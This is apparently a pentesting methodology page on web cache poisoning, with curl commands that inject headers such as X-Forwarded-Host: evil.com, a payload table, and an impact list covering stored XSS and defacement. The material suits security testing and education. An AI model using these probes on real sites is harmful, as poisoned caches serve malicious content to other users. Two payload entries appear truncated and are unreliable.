Web Cache Poisoning

Web cache poisoning techniques and testing methodology.

What is Web Cache Poisoning?

Web cache poisoning is an advanced technique whereby an attacker causes the web server to cache harmful content that is later served to other users. This can lead to:

  • XSS via cache
  • Session hijacking
  • Data theft
  • Defacement

Manual Testing

1. Identify Cache Behavior

curl -I https://target.com | grep -i cache

Look for headers like:

  • X-Cache
  • X-Cache-Hits
  • CF-Cache-Status (Cloudflare)
  • X-Served-By

2. Test Cache Key Poisoning

# First request - poison the cache
curl "https://target.com/page?param=value" -H "X-Forwarded-Host: evil.com"

# Second request - check if poisoned
curl "https://target.com/page"

3. Host Header Poisoning

curl -I https://target.com -H "Host: evil.com"
curl -I https://target.com -H "X-Forwarded-Host: evil.com"
curl -I https://target.com -H "X-Original-URL: /admin"

4. Query Parameter Poisoning

# Find unkeyed parameters
curl "https://target.com/page?cb=1&utm_source=evil"
curl "https://target.com/page?cb=2&utm_source=evil"

Common Cache Poisoning Payloads

Technique Payload
Host Header X-Forwarded-Host: evil.com
Port Injection Host: target.com:evil.com
Query String ?utm_source=
Path Normalization /page/../admin
Method Override X-HTTP-Method-Override: POST
Accept Header Accept: text/html,

Impact Escalation

  • Stored XSS: Cache malicious JS to serve all users
  • Data Extraction: Cache pages with sensitive data
  • Defacement: Cache modified page content
  • DoS: Cache error pages or redirects
